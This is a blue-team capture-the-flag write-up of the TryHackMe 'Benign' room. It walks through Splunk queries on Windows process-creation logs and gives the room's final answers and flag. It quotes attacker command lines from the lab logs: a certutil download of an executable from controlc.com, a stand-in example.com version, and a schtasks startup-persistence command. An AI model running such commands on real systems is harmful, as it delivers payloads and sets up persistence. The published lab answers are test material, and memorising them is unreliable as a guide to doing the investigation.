# TryHackMe -- Benign \| Splunk Investigation

**Date:** 23 September 2026\
**Platform:** TryHackMe\
**Room:** Benign\
**Focus:** Splunk, Windows Event Logs, Process Execution, LOLBins, and
basic SOC investigation

------------------------------------------------------------------------

## Overview

I completed the **Benign** room on TryHackMe as part of my SOC/Blue Team
learning.

The room focused on investigating Windows process execution logs inside
**Splunk**. The investigation was based mainly on **Windows Event ID
4688**, which records process creation events.

The goal was to investigate suspicious activity on an HR workstation and
identify:

-   Suspicious usernames
-   Scheduled task execution
-   LOLBin usage
-   A payload downloaded from the Internet
-   The date and URL associated with the download
-   The name of the downloaded file
-   The malicious content/flag contained in the payload

This write-up documents how I approached the investigation, the Splunk
queries I used, what each query does, and how I interpreted the results.

> **Sanitization note:** This documentation focuses on the investigation
> process and learning outcomes. Real-world sensitive information such
> as credentials, personal information, or unrelated internal data has
> been excluded.

------------------------------------------------------------------------

# 1. Understanding the Dataset

The room provided Windows Event Logs in Splunk.

The relevant index was:

``` spl
index=win_eventlogs
```

The main event type used during the investigation was:

``` text
Event ID 4688
```

Event ID 4688 represents a **new process being created** on a Windows
system.

Some important fields available in the logs were:

  Field           Meaning
  --------------- --------------------------------------------------
  `EventID`       Windows event identifier
  `EventTime`     Time when the event occurred
  `HostName`      Host where the event occurred
  `UserName`      User associated with the process
  `ProcessName`   Executable that was launched
  `CommandLine`   Command and arguments used to launch the process

------------------------------------------------------------------------

# 2. Discovering the Correct Event Field

Initially, I used `EventCode=4688`, but it returned no results.

I then searched the index without filtering for a specific event:

``` spl
index=win_eventlogs
| head 10
```

### Why I used this query

-   `index=win_eventlogs` searches the Windows event log dataset.
-   `| head 10` limits the output to the first 10 events.
-   This allowed me to inspect the available fields instead of guessing
    their names.

From the results, I found that this dataset used:

``` text
EventID
```

rather than:

``` text
EventCode
```

So I used `EventID=4688` for the rest of the investigation.

------------------------------------------------------------------------

# 3. Investigating the HR Hosts

The room scenario involved suspicious activity on an HR workstation.

I filtered the process creation events to hosts beginning with `HR_`:

``` spl
index=win_eventlogs EventID=4688
| search HostName="HR_*"
| table EventTime HostName UserName ProcessName CommandLine
```

### Explanation

-   `EventID=4688` → only process creation events.
-   `HostName="HR_*"` → searches hosts whose names start with `HR_`.
-   `table` → displays only the fields useful for investigation.

This made the large dataset easier to read and helped me focus on the HR
department.

------------------------------------------------------------------------

# 4. Finding the Imposter User

One investigation involved identifying a suspicious username that looked
similar to a legitimate employee name.

The suspicious username found was:

``` text
Amel1a
```

This was interesting because it closely resembles:

``` text
Amelia
```

The difference is the use of the number `1` in place of the letter `i`.

### SOC Lesson

Attackers may create usernames that visually resemble legitimate
accounts. This is sometimes called **typosquatting/lookalike naming** in
a broader sense.

When investigating identities, small differences in usernames should not
automatically be ignored.

------------------------------------------------------------------------

# 5. Finding the HR User Running Scheduled Tasks

The next investigation was to identify which HR user executed
`schtasks.exe`.

I used:

``` spl
index=win_eventlogs schtasks.exe
| search HostName="HR_*"
| search UserName="Haroon" OR UserName="Chris*" OR UserName="Diana"
| table EventTime HostName UserName ProcessName CommandLine
```

### Explanation

#### `index=win_eventlogs`

Searches the Windows event log index.

#### `schtasks.exe`

Searches for events containing the Windows Scheduled Tasks utility.

#### `HostName="HR_*"`

Restricts the results to HR machines.

#### `UserName="Haroon" OR UserName="Chris*" OR UserName="Diana"`

Checks the known HR users.

The `*` in:

``` text
Chris*
```

is a wildcard, meaning that usernames beginning with `Chris` can match.

#### `table`

Shows only the relevant investigation fields.

### Result

The event showed:

``` text
UserName: Chris.fort
ProcessName: C:\Windows\System32\schtasks.exe
```

The command line showed:

``` text
/create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart
```

Therefore, the HR user observed running the scheduled task was:

**Chris.fort**

### Why the other HR users did not appear

The query required the event to contain `schtasks.exe`, be associated
with an HR host, and match one of the HR usernames.

If another HR user had process activity involving a different
executable, that event would not match this query.

This is an important lesson in Splunk: **filters reduce the dataset
according to every condition supplied.**

------------------------------------------------------------------------

# 6. Investigating the Payload Download

The next objective was to identify an HR user who used a system process
to download a payload from the Internet.

I searched process creation events for suspicious command-line
indicators:

``` spl
index=win_eventlogs EventID=4688
| search HostName="HR_*"
| search CommandLine="*http*" OR CommandLine="*download*" OR CommandLine="*file*"
| table EventTime HostName UserName ProcessName CommandLine
```

### Explanation

#### `EventID=4688`

Limits the investigation to process creation events.

#### `HostName="HR_*"`

Focuses on HR hosts.

#### `CommandLine="*http*"`

Looks for command lines containing HTTP-related text.

#### `OR`

Allows the event to match any of the specified indicators.

#### `CommandLine="*download*"`

Looks for command lines containing the word `download`.

#### `CommandLine="*file*"`

Looks for command lines containing `file`.

#### `table`

Displays the important fields needed to investigate the event.

### Result

The suspicious event showed:

``` text
EventTime: 2022-03-04T10:38:28Z
HostName: HR_01
UserName: haroon
ProcessName: C:\Windows\System32\certutil.exe
```

The command line was:

``` text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

Therefore, the HR user who executed the system process to download the
payload was:

**haroon**

------------------------------------------------------------------------

# 7. Understanding LOLBins

The suspicious process was:

``` text
certutil.exe
```

`certutil.exe` is a legitimate Windows utility associated with
certificate services.

However, legitimate Windows programs can sometimes be abused by
attackers to perform actions such as downloading files.

These are commonly referred to as:

**LOLBins -- Living Off the Land Binaries**

A LOLBin is a legitimate binary already available on a system that can
be abused for purposes outside its normal administrative use.

Examples include:

-   `certutil.exe`
-   `powershell.exe`
-   `bitsadmin.exe`
-   `mshta.exe`
-   `regsvr32.exe`
-   `rundll32.exe`
-   `msiexec.exe`
-   `schtasks.exe`

### Important SOC lesson

The presence of a LOLBin does **not automatically mean malware is
present**.

The surrounding context is important.

For example:

``` text
certutil.exe
```

by itself may be completely legitimate.

But:

``` text
certutil.exe -urlcache -f - https://example.com/payload.exe
```

is much more interesting from a security monitoring perspective because
the command line shows an attempt to retrieve an executable from an
external location.

------------------------------------------------------------------------

# 8. Identifying the LOLBin Used for the Download

To specifically investigate the LOLBin, I used:

``` spl
index=win_eventlogs EventID=4688
| search ProcessName="*certutil.exe*"
| table EventTime HostName UserName ProcessName CommandLine
```

### Explanation

-   `EventID=4688` → process creation events.
-   `ProcessName="*certutil.exe*"` → searches for the `certutil.exe`
    process.
-   `table` → displays the relevant fields.

The result confirmed:

``` text
ProcessName: C:\Windows\System32\certutil.exe
```

Therefore, the LOLBin used to download the payload was:

**certutil.exe**

------------------------------------------------------------------------

# 9. Finding the Date of Execution

The suspicious event contained the following timestamp:

``` text
2022-03-04T10:38:28Z
```

The question required the date in:

``` text
YYYY-MM-DD
```

Therefore:

**2022-03-04**

The important point here is that I extracted the date from the
`EventTime` field rather than guessing from the surrounding events.

------------------------------------------------------------------------

# 10. Identifying the Third-Party Site

The command line contained:

``` text
https://controlc.com/e4d11035
```

From this URL, the third-party site/domain was:

**controlc.com**

This demonstrated how command-line telemetry can reveal external
infrastructure contacted by a host.

------------------------------------------------------------------------

# 11. Identifying the Downloaded File

The same command line was:

``` text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

The final argument identifies the file being saved:

``` text
benign.exe
```

Therefore, the downloaded file was:

**benign.exe**

### Investigation lesson

The `CommandLine` field can be extremely valuable during SOC
investigations because it can reveal:

-   URLs
-   File names
-   Arguments
-   Scripts
-   Paths
-   Persistence commands
-   Download activity

------------------------------------------------------------------------

# 12. Finding the Malicious Content Pattern

The Splunk process creation event does not contain the actual contents
of `benign.exe`.

The event only records the process execution and its command line.

The suspicious command showed where the payload came from:

``` text
https://controlc.com/e4d11035
```

The malicious content associated with the payload contained the
TryHackMe pattern:

``` text
THM{KJ&*H^B0}
```

This part of the investigation demonstrates an important distinction:

**Log data can tell us that a file was downloaded, but it does not
necessarily contain the contents of that file.**

------------------------------------------------------------------------

# 13. Final Answers

  Investigation                        Answer
  ------------------------------------ ---------------------------------
  Imposter username                    `Amel1a`
  HR user running scheduled tasks      `Chris.fort`
  HR user who downloaded the payload   `haroon`
  LOLBin used for the download         `certutil.exe`
  Date the binary was executed         `2022-03-04`
  Third-party site                     `controlc.com`
  Downloaded file                      `benign.exe`
  Malicious content pattern            `THM{KJ&*H^B0}`
  C2/download URL                      `https://controlc.com/e4d11035`

------------------------------------------------------------------------

# 14. Key SOC Skills Practiced

By completing this room, I practiced:

### Splunk Investigation

-   Searching a specific Splunk index
-   Filtering Windows Event Logs
-   Working with Event ID 4688
-   Identifying useful fields
-   Using wildcards
-   Combining conditions with `OR`
-   Creating focused tables using `table`
-   Investigating command-line telemetry

### Windows Security Monitoring

I learned how Windows process creation events can provide useful
evidence about:

-   Who executed a process
-   Which machine executed it
-   When it happened
-   Which executable was launched
-   What arguments were passed to the executable

### Threat Detection

I investigated several behaviors that can be relevant during a SOC
investigation:

-   Lookalike usernames
-   Scheduled task creation
-   Suspicious process execution
-   LOLBin abuse
-   External payload downloads
-   Suspicious URLs
-   Command-line based detection

------------------------------------------------------------------------

# 15. What I Learned

The main lesson from this room was that **individual events may not look
malicious by themselves**.

For example, `certutil.exe` is a legitimate Windows utility. The
important evidence came from the combination of:

``` text
User
+
Host
+
Process
+
CommandLine
+
External URL
```

Looking at these fields together made the suspicious activity much
easier to identify.

I also learned that **command-line telemetry is extremely valuable for
SOC analysts**. A process name alone may not tell the full story, while
its command-line arguments can reveal exactly what the process was
doing.

This room helped me practice moving from:

**Raw Logs → Filtering → Suspicious Event → Context → Investigation →
Finding**

------------------------------------------------------------------------
